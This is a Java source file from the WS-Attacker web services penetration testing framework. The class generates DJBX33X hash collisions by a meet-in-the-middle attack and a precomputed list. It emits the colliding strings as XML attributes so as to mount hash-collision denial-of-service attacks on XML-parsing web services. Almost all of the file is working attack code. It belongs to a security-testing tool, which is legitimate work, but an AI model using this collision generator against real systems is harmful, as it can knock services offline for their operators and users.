/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos.dosExtension.attackClasses.hashDos;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.FileInputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.HashMap;
import java.util.Random;
import java.util.logging.Level;
import java.util.logging.Logger;

public class CollisionDJBX33X implements CollisionInterface {

    @Override
    public int getHash(String s) {
	byte[] byteArray = s.getBytes();
	int n = byteArray.length;
	int hash = 5381;
	for (int i = 0; i < n; i++) {
	    //System.out.println(i +" out of "+n+" mit Byte: "+(int)byteArray[i]+" und Hash preCalc: "+ (33*hash) +" - HashFinal: "+((33*hash)+(int)byteArray[i]));
	    hash = ((hash << 5) + hash) ^ (int) byteArray[i];
	}
	//System.out.println(hash);
	return hash;
    }

    public int hashBack(String s, int target) {
	byte[] byteArray = s.getBytes();
	int n = byteArray.length;
	int hash = target;
	for (int i = n; i > 0; i--) {
	    //System.out.println(i + " out of " + n + " mit Byte: " + (int) byteArray[i - 1] + " - HashFinal: " + (hash ^ (int) byteArray[i - 1]) * 1041204193);
	    //hash = ((hash<<5)+hash)^(int)byteArray[i];
	    hash = ((hash ^ (int) byteArray[i - 1]) * 1041204193);
	}
	//System.out.println(hash);
	return hash;
    }

    public int hashForth(String s) {
	byte[] byteArray = s.getBytes();
	int n = byteArray.length;
	int hash = 5381;
	for (int i = 0; i < n; i++) {
	    //System.out.println(i + " out of " + n + " mit Byte: " + (int) byteArray[i] + " und Hash preCalc: " + (33 * hash) + " - HashFinal: " + ((33 * hash) + (int) byteArray[i]));
	    hash = ((hash << 5) + hash) ^ (int) byteArray[i];
	}
	//System.out.println(hash);
	return hash;
    }

    /**
     * For this Hash Algrorithm it actually reads values from precomputed table
     * due to lengthy collsion computation
     */
    @Override
    public void genNCollisions(int n, StringBuilder sb, boolean useNamespace) {
	try {
	    // Open the file 
	    InputStream is = getClass().getResourceAsStream("/DJBX33XCollisions/DJBX33XCollisions.txt");
	    BufferedReader br = new BufferedReader(new InputStreamReader(is));

	    String prefix = "";
	    if(useNamespace==true){
		prefix = "xmlns:";
	    }
	    
	    // check if exists
	    if (br == null) {
		//The file was not found, insert error handling here
		System.err.println("File CollisionDJBX33XCollisions.txt was not found!");
	    }

	    // create final String
	    String strLine;
	    sb.append("");
	    long k = 0;
	    while (k < n && (strLine = br.readLine()) != null) {
		//strLine = br.readLine();
		sb.append(prefix+strLine + "=\"" + k + "\" ");
		k++;
	    }

	    //Close the input stream
	    br.close();
	} catch (Exception e) {//Catch exception if any
	    System.err.println("Error: " + e.getMessage());
	}
    }

    /**
     * Not really required for DJBX33X since we are using precomputed values and
     * read everything directly from file!
     *
     * @param i i-th row out of n
     * @param n collisions total
     * @return
     */
    @Override
    public String getCollisionString(int i, int n) {
	String strLine = "";
	try {
	    // Open the file + check if file exists
	    InputStream is = getClass().getResourceAsStream("/DJBX33XCollisions/DJBX33XCollisions.txt");
	    BufferedReader br = new BufferedReader(new InputStreamReader(is));
	    if (br == null) {
		//The file was not found, insert error handling here
		System.err.println("File CollisionDJBX33XPrecomputed.txt was not found!");
	    }

	    // find i-th string
	    long k = 0;
	    while (k < i && (strLine = br.readLine()) != null) {
		k++;
	    }

	    //Close the input stream
	    br.close();
	} catch (IOException ex) {
	    Logger.getLogger(CollisionDJBX33X.class.getName()).log(Level.SEVERE, null, ex);
	}
	return strLine;
    }

    /**
     * get random AlphaNumericString of Length length
     *
     * @param length
     * @return
     */
    public String getRandomString(int length) {
	String AB = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	Random rnd = new Random();
	StringBuilder sb = new StringBuilder(length);
	for (int i = 0; i < length; i++) {
	    sb.append(AB.charAt(rnd.nextInt(AB.length())));
	}
	return sb.toString();
    }

    /**
     * Gets the i-th AlphaNumeric-String out of a n char String Example: n = 3
     * -> 62^3 possible 3 char strings!
     *
     * @param i
     * @param n
     * @return
     */
    public String getIthNCharString(int i, int n) {
	// init Bytes with collision Strings
	String ABC = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

	// init empty ByteArray of correct Size for holding result!
	int numberElements = n;
	byte[] output = new byte[numberElements];
	for (int j = 0; j < numberElements; j++) {
	    output[j] = '0';
	}

	// do calculation
	int divisor = i;
	int rest = 0;
	int count = numberElements - 1;
	while (divisor != 0) {
	    rest = divisor % 62;
	    divisor = divisor / 62;
	    System.out.println(rest);
	    output[count] = (byte) ABC.charAt(rest);
	    count -= 1;
	}
	//System.out.println("--StringNew: "+new String(output));
	return new String(output);
    }

    /**
     * Generates collisions for DJBX33X using the MeetInTheMiddle-Attack The
     * Parameter "numberTrys" says how many times the algorithm should test for
     * a collision. At the end the number of found collsions is returned!
     *
     * @param numberCollisions - in this case limited to 62^7 = 3,521614606×10¹²
     * = 000000000
     */
    public int generateCollionsMeetInTheMiddle(long numberCollisions) {
	// generate Datastructures
	int numberOfFoundCollisions = 0;
	int targetHash = 0;
	int hashBackResult = 0;
	int hashForthResult = 0;
	int hashBackResultCounter = 0;
	String s3SuffixMatch = "";
	String s3Suffix;
	StringBuilder sb = new StringBuilder();
	String s7Prefix;
	HashMap<Integer, String> lookupMapHashBack = new HashMap<Integer, String>();
	HashMap<String, Integer> lookupMapCollision = new HashMap<String, Integer>();

	try {

	    System.out.println("Start generateCollionsMeetInTheMiddle");

	    // fillup LookupTable with 62^3 = 238328 Values
	    // - will result in 59444 unique entries (others are already collisions)
	    // - (in Paper: 2^16 = 65536 values = 16 bit = register width)
	    for (int i = 0; i < 238328; i++) {
		// create "random" 3 byte suffix
		s3Suffix = getIthNCharString(i, 3);

		// Check if s3suffix already in Hashtable
		hashBackResult = hashBack(s3Suffix, targetHash);
		if (lookupMapHashBack.get(hashBackResult) == null) {
		    // calculate HashBack value +
		    // save result to Hashtable!
		    lookupMapHashBack.put(hashBackResult, s3Suffix);
		    hashBackResultCounter++;
		}
	    }

	    System.out.println("Done LookupTable with " + hashBackResultCounter + " unique Values");

	    // open File
	    FileWriter fstream;
	    fstream = new FileWriter("outDJBX33X.txt");
	    BufferedWriter out = new BufferedWriter(fstream);

	    // create random 7 byte Prefix-Strings and calculate HashForth-Value
	    // Then test if HashForth-Value is equal to an index in lookuptable.
	    // If match found do concat(7bytePrefix, 3ByteSuffix), which equals the preimage resulting in:
	    // h(preimage)=target
	    int k = 0;
	    while (numberOfFoundCollisions < numberCollisions) {
		// create "random" 7 byte prefix
		s7Prefix = getRandomString(7); //getIthNCharString(k, 7);
		k++;

		// calculate HashForth value
		hashForthResult = hashForth(s7Prefix);

		// check if match in Hashtable!
		s3SuffixMatch = lookupMapHashBack.get(hashForthResult);
		if (s3SuffixMatch != null) {
		    // check if attribute Starts with number -> ignore
		    if(!s7Prefix.matches("^[0-9]+[0-9a-zA-Z]*$")){
			// check if s7Prefix already in Final Result?
			if (lookupMapCollision.get(s7Prefix + s3SuffixMatch) == null) {			
			    // save result to Hashtable - so we can check that not in twice
			    lookupMapCollision.put(s7Prefix + s3SuffixMatch, numberOfFoundCollisions);

			    // build collision String +
			    // save to file/String
			    sb.append(s7Prefix);
			    sb.append(s3SuffixMatch);
			    sb.append("=\"" + numberOfFoundCollisions + "\" ");
			    numberOfFoundCollisions++;
			    out.write(s7Prefix + s3SuffixMatch + "\n");
			} else {
			    System.out.println("Already found Collision: " + s7Prefix + s3SuffixMatch);
			}			    
		    }else{
			//System.out.println("Attribute Starts with number: "+ s7Prefix);
		    }
		}
		// System.out.println("Collision Try: "+k);
	    }
	    out.close();
	    System.out.println("numberOfFoundCollisions: " + numberOfFoundCollisions);
	} catch (IOException e) {
	    e.printStackTrace();
	}

	return numberOfFoundCollisions;
    }
}
